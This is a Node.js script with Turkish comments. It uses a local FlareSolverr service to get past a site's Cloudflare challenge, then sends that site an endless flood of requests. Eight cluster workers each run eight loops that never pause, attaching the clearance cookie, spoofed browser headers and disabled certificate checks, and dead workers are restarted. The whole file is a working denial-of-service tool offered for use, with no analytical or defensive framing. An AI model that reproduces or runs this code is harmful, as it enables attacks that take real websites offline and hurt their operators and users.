const cluster = require('cluster');
const http = require('http');
const https = require('https');
const os = require('os');
const { URL } = require('url');

const flaresolverrUrl = 'http://localhost:8191/v1';
const userAgent = 'Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36';
const numCPUs = 8; // Daha fazla worker
const parallelRequestsPerWorker = 8; // Çok daha agresif
const requestInterval = 0; // Hiç bekleme

const targetUrl = process.argv[2];
if (!targetUrl || !/^https?:\/\/[^\s$.?#].[^\s]*$/.test(targetUrl)) {
    console.error('Error: Please provide a valid URL (e.g., http://example.com or https://example.com)');
    process.exit(1);
}

// URL'yi parse et
const parsedUrl = new URL(targetUrl);

function makeFlareSolverrRequest() {
    return new Promise((resolve, reject) => {
        const postData = JSON.stringify({
            cmd: 'request.get',
            url: targetUrl,
            maxTimeout: 60000
        });

        const options = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': userAgent,
                'Content-Length': Buffer.byteLength(postData)
            }
        };

        const req = http.request(flaresolverrUrl, options, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
                try {
                    const response = JSON.parse(data);
                    if (response.status === 'ok' && response.solution) {
                        resolve(response.solution);
                    } else {
                        reject(new Error('FlareSolverr geçerli bir çözüm döndürmedi'));
                    }
                } catch (error) {
                    reject(error);
                }
            });
        });

        req.on('error', (error) => reject(error));
        req.write(postData);
        req.end();
    });
}

function makeRequestWithCookie(cookie) {
    return new Promise((resolve) => {
        const options = {
            method: 'GET',
            hostname: parsedUrl.hostname,
            port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
            path: parsedUrl.pathname + parsedUrl.search,
            headers: {
                'Host': parsedUrl.hostname,
                'User-Agent': userAgent,
                'Cookie': cookie,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Encoding': 'gzip, deflate' + (parsedUrl.protocol === 'https:' ? ', br' : ''),
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            },
            // SSL doğrulamasını devre dışı bırak
            rejectUnauthorized: false
        };

        const requestModule = parsedUrl.protocol === 'https:' ? https : http;
        
        const req = requestModule.request(options, (res) => {
            res.on('data', () => {});
            res.on('end', () => {
                console.log(`Worker ${process.pid} - İstek gönderildi, yanıt kodu: ${res.statusCode}`);
                resolve();
            });
        });

        req.on('error', (error) => {
            console.error(`Worker ${process.pid} - İstek hatası: ${error.message}`);
            resolve();
        });

        req.setTimeout(5000, () => {
            req.destroy();
            console.error(`Worker ${process.pid} - İstek zaman aşımı`);
            resolve();
        });

        req.end();
    });
}

if (cluster.isMaster) {
    console.log(`Master ${process.pid} çalışıyor, ${numCPUs} worker başlatılıyor...`);

    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    makeFlareSolverrRequest()
        .then((solution) => {
            const cookie = solution.cookies.map(c => `${c.name}=${c.value}`).join('; ');
            console.log('Cookie alındı, worker\'lar başlatılıyor...');

            for (const id in cluster.workers) {
                cluster.workers[id].send({ cookie });
            }
        })
        .catch((error) => {
            console.error('Cookie alma hatası:', error.message);
            setTimeout(() => process.exit(1), 5000);
        });

    cluster.on('exit', (worker, code, signal) => {
        console.log(`Worker ${worker.process.pid} kapandı (code: ${code}, signal: ${signal}). Yeni worker başlatılıyor...`);
        cluster.fork();
    });

} else {
    process.on('message', async (msg) => {
        const cookie = msg.cookie;
        console.log(`Worker ${process.pid} cookie aldı ve başladı`);
        
        for (let i = 0; i < parallelRequestsPerWorker; i++) {
            const sendRequest = async () => {
                while (true) {
                    await makeRequestWithCookie(cookie);
                }
            };
            setImmediate(sendRequest);
        }
    });
}